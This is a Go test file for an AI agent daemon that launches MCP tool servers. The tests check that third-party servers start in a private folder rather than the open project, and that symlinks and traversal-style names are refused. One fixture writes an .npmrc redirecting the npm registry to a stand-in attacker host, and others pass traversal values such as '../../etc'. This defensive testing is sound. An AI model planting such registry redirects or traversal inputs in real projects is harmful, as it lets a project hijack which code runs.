package main

import (
	"context"
	"encoding/json"
	"io"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"mochiii/protocol"
)

// serverCwd starts the echo server through buildRegistry -- the path an agent
// turn takes -- and returns the folder the server says it is running in.
func serverCwd(t *testing.T, s *Server, srv MCPServerConfig) string {
	t.Helper()
	srv.Command = buildEchoServer(t)
	srv.Args = []string{"--report-cwd"}
	srv.AcknowledgedUnconfined = true
	s.cfg.MCP.Servers = map[string]MCPServerConfig{"echo": srv}

	registry, errs := s.buildRegistry(context.Background(), log.New(io.Discard, "", 0), &proposalSink{}, "")
	t.Cleanup(func() { _ = registry.Close() })
	if len(errs) != 0 {
		t.Fatalf("the server did not start: %v", errs)
	}
	res, err := registry.Call(context.Background(), "echo__cwd", json.RawMessage(`{}`))
	if err != nil || res.IsError {
		t.Fatalf("asking the server where it runs: err=%v result=%q", err, res.Content)
	}
	return resolved(t, strings.TrimSpace(res.Content))
}

// resolved is path with its symlinks followed: a temp folder is reached through
// one on macOS, and two spellings of one folder must compare equal.
func resolved(t *testing.T, path string) string {
	t.Helper()
	real, err := filepath.EvalSymlinks(path)
	if err != nil {
		t.Fatalf("resolving %s: %v", path, err)
	}
	return real
}

// A THIRD-PARTY SERVER DOES NOT START IN THE PROJECT BEING WORKED ON.
//
// FOUND 2026-10-12 by reading, reproduced by this test before the fix: Connect
// never set the subprocess's folder, so a server started wherever the daemon
// had been -- and the VS Code extension starts the daemon inside the open
// project. Servers a user adds are stored once and started for every project,
// and a launcher decides what to run partly from the current folder: npx reads
// the project's .npmrc and prefers node_modules/.bin, `python -m` puts the
// folder first on its import path. So a cloned project could change which
// program a stored line runs, at the start of a turn, before any tool asks.
//
// Neuter check: drop `Dir` from laneBLaunchConfig's result.
func TestAThirdPartyServerDoesNotStartInTheProject(t *testing.T) {
	buildEchoServer(t)     // built from this package's folder, before the test leaves it
	project := t.TempDir() // where the daemon was started: somebody else's repository
	t.Chdir(project)
	if err := os.WriteFile(filepath.Join(project, ".npmrc"), []byte("registry=https://attacker.example/\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	s := mcpAdminTestServer(t)
	s.workspace = project
	got := serverCwd(t, s, MCPServerConfig{})

	if got == resolved(t, project) {
		t.Fatalf("the server started in the project (%s), where the project decides what a launcher runs", got)
	}
	want := resolved(t, filepath.Join(s.mcpRunDir, "echo"))
	if got != want {
		t.Errorf("the server started in %s, want its own private folder %s", got, want)
	}
	if entries, err := os.ReadDir(got); err != nil || len(entries) != 0 {
		t.Errorf("the folder a server starts in must hold nothing a project put there: %v %v", entries, err)
	}
}

// THE PROJECT IS STILL AVAILABLE TO A SERVER WHOSE BLOCK ASKS FOR IT, in so many
// words: some servers (a git one, a test runner) are about the project.
func TestAServerStartsInTheProjectOnlyWhenItsBlockSaysSo(t *testing.T) {
	buildEchoServer(t)
	project := t.TempDir()
	elsewhere := t.TempDir()
	t.Chdir(elsewhere)

	s := mcpAdminTestServer(t)
	s.workspace = project
	if got := serverCwd(t, s, MCPServerConfig{Cwd: ServerCwdWorkspace}); got != resolved(t, project) {
		t.Errorf("a server asking for the project started in %s, want %s", got, resolved(t, project))
	}
}

// WITH NOWHERE PRIVATE TO START IT, A SERVER IS NOT STARTED. It never falls
// back to the folder the daemon happens to be in: that fallback is the defect.
func TestAServerWithNoPrivateFolderIsNotStarted(t *testing.T) {
	s := mcpAdminTestServer(t)
	s.mcpRunDir = ""
	s.cfg.MCP.Servers = map[string]MCPServerConfig{
		"echo": {Command: buildEchoServer(t), AcknowledgedUnconfined: true},
	}
	registry, errs := s.buildRegistry(context.Background(), log.New(io.Discard, "", 0), &proposalSink{}, "")
	t.Cleanup(func() { _ = registry.Close() })
	if len(errs) != 1 || !strings.Contains(errs[0].Error(), "server echo:") {
		t.Fatalf("want one error naming the server, got %v", errs)
	}
	if tools, _ := registry.Advertised(context.Background()); len(tools) != 0 {
		t.Errorf("a server that was not started advertises %d tool(s)", len(tools))
	}
}

// THE ONLY FOLDER A BLOCK CAN NAME IS THE PROJECT. A path would let a config
// file -- or a request -- start a server anywhere, which is the thing the
// private folder exists to stop.
func TestAServerBlockMayOnlyNameTheProjectAsItsFolder(t *testing.T) {
	for _, cwd := range []string{"/tmp", "..", ".", "Workspace", "~/project"} {
		if err := validateServerBlock(MCPServerConfig{Command: "server", Cwd: cwd}); err == nil {
			t.Errorf("a block with \"cwd\": %q was accepted", cwd)
		}
	}
	for _, cwd := range []string{"", ServerCwdWorkspace} {
		if err := validateServerBlock(MCPServerConfig{Command: "server", Cwd: cwd}); err != nil {
			t.Errorf("a block with \"cwd\": %q was refused: %v", cwd, err)
		}
	}
}

// A SERVER'S NAME DOES NOT CHOOSE ITS FOLDER. A server in the config file may
// be called anything that does not break the registry, and that includes names
// that climb out of a folder.
func TestAServerNameCannotChooseItsFolder(t *testing.T) {
	s := mcpAdminTestServer(t)
	base := resolved(t, s.mcpRunDir)
	for _, name := range []string{"..", "../../etc", "a/b", `a\b`, "/abs", "Has Space", ".", "x/../../y"} {
		dir, err := s.serverStartDir(name, MCPServerConfig{})
		if err != nil {
			t.Errorf("%q: %v", name, err)
			continue
		}
		if got := resolved(t, filepath.Dir(dir)); got != base {
			t.Errorf("the server named %q starts in %s, which is not directly inside %s", name, dir, base)
		}
	}
	// Two different names never share a folder.
	a, _ := s.serverStartDir("a/b", MCPServerConfig{})
	b, _ := s.serverStartDir("a/c", MCPServerConfig{})
	if a == b {
		t.Errorf("two servers were given one folder: %s", a)
	}
}

// A LINK WHERE THE FOLDER SHOULD BE IS REFUSED: it looks exactly like the
// private folder and can point at a project.
func TestAServerIsNotStartedThroughALink(t *testing.T) {
	s := mcpAdminTestServer(t)
	project := t.TempDir()
	if err := os.Symlink(project, filepath.Join(s.mcpRunDir, "echo")); err != nil {
		t.Skipf("this platform will not make a link here: %v", err)
	}
	if dir, err := s.serverStartDir("echo", MCPServerConfig{}); err == nil {
		t.Fatalf("a link to %s was accepted as the server's own folder (%s)", project, dir)
	}
}

// THE FOLDER IS PRIVATE EVEN IF IT WAS LEFT OPEN.
func TestTheStartFolderIsMadePrivate(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("permission bits do not describe access on Windows")
	}
	s := mcpAdminTestServer(t)
	open := filepath.Join(s.mcpRunDir, "echo")
	if err := os.MkdirAll(open, 0o777); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(open, 0o777); err != nil {
		t.Fatal(err)
	}
	dir, err := s.serverStartDir("echo", MCPServerConfig{})
	if err != nil {
		t.Fatal(err)
	}
	info, err := os.Stat(dir)
	if err != nil {
		t.Fatal(err)
	}
	if got := info.Mode().Perm(); got != 0o700 {
		t.Errorf("the folder is mode %#o, want 0700", got)
	}
}

// WHAT A USER AGREES TO SAYS WHERE THE SERVER WILL RUN, in both cases, before
// anything is stored -- and the choice they agreed to is the one that is kept.
func TestAddingAServerSaysAndKeepsWhereItStarts(t *testing.T) {
	bin := buildEchoServer(t)

	t.Run("a folder of its own", func(t *testing.T) {
		s := mcpAdminTestServer(t)
		asked := s.mcpResult(context.Background(), addRequest("echo", bin))
		if !asked.NeedsAcknowledgement || !strings.Contains(asked.Detail, "in a folder of its own, not in your project") {
			t.Fatalf("the warning does not say the server starts in its own folder:\n%s", asked.Detail)
		}
	})

	t.Run("the project, when asked for", func(t *testing.T) {
		s := mcpAdminTestServer(t)
		req := addRequest("echo", bin)
		req.Cwd = protocol.MCPCwdWorkspace
		asked := s.mcpResult(context.Background(), req)
		if !asked.NeedsAcknowledgement || !strings.Contains(asked.Detail, "INSIDE whatever project") {
			t.Fatalf("the warning does not say the server starts in the project:\n%s", asked.Detail)
		}
		req.AcknowledgedUnconfined = true
		if added := s.mcpResult(context.Background(), req); !added.Ok {
			t.Fatalf("the add failed: %s", added.Error)
		}
		if got := storedServers(t, s)["echo"].Cwd; got != ServerCwdWorkspace {
			t.Errorf("stored \"cwd\": %q, want %q", got, ServerCwdWorkspace)
		}
	})

	t.Run("nowhere else", func(t *testing.T) {
		s := mcpAdminTestServer(t)
		req := addRequest("echo", bin)
		req.Cwd = "/tmp"
		if resp := s.mcpResult(context.Background(), req); resp.Error == "" || len(storedServers(t, s)) != 0 {
			t.Errorf("a request naming a folder of its own choosing was not refused: %+v", resp)
		}
	})
}

// laneBLaunchConfig PASSES ON THE FOLDER IT WAS GIVEN. It takes one as a
// parameter so that no caller can start a server without having said where.
func TestALaneBLaunchCarriesItsFolder(t *testing.T) {
	cfg := &Config{}
	lc := laneBLaunchConfig("thirdparty", MCPServerConfig{Command: "server"}, cfg, "/somewhere/private", io.Discard, log.New(io.Discard, "", 0).Printf)
	if lc.Dir != "/somewhere/private" {
		t.Errorf("the launch starts in %q, want the folder it was given", lc.Dir)
	}
}
